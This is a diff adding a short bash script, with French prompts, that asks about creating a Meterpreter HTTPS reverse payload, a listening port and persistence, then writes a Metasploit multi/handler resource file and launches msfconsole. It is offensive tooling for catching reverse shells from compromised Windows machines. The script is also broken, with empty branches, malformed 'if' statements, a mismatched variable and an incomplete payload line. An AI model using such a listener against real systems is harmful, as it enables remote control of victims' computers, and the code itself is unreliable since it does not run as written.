@@ -1,0 +1,39 @@
+#! /bin/bash
+
+echo "************************"
+echo "       MACLISTENER      "
+echo "- majestikfortress.com -"
+echo "************************"
+echo "************************"
+echo "************************"
+echo "Meterpreter HTTPS reverse"
+echo "    CREER LE PAYLOAD    "
+echo "         Y ou N         "
+read payload
+if [ $ANSWER = "yY" ] ; then payload=""
+else payload=""
+fi
+echo "************************"
+echo "************************"
+echo "************************"
+echo "     Choix du port      "
+read port
+echo "************************"
+echo "************************"
+echo "************************"
+echo "Persistence ? Y ou N"
+read persistence
+if []
+echo "************************"
+echo "************************"
+echo "************************"
+echo "Choix du port persistence"
+read port2
+if CREATE==1;
+cat << EOF > /tmp/auto_listnr.rc
+use exploit/multi/handler
+set windows/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT $port
+EOF
+msfconsole -r /tmp/auto_listnr.rc
